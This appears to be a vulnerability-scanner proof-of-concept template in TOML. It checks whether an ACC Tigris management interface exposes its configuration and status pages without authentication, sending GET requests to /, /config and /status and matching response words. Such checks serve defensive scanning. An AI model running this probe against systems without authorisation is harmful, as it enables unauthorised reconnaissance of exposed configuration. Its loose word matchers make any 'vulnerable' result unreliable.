[info]
author = "ave"
description = "检测 ACC Tigris 管理界面是否存在未授权访问漏洞，远程攻击者无需认证即可直接访问系统配置页面"
id = "POC-AVE-1999-0619"
name = "ACC Tigris 未授权访问漏洞 PoC"
severity = "high"
tags = ["ave-1999-0619"]
vuln_id = [
    "CVE-1999-0383",
    "AVE-1999-0619",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ACC",
    "Tigris",
    "configuration",
    "config",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/config"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ACC",
    "Tigris",
    "config",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/status"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ACC",
    "Tigris",
]
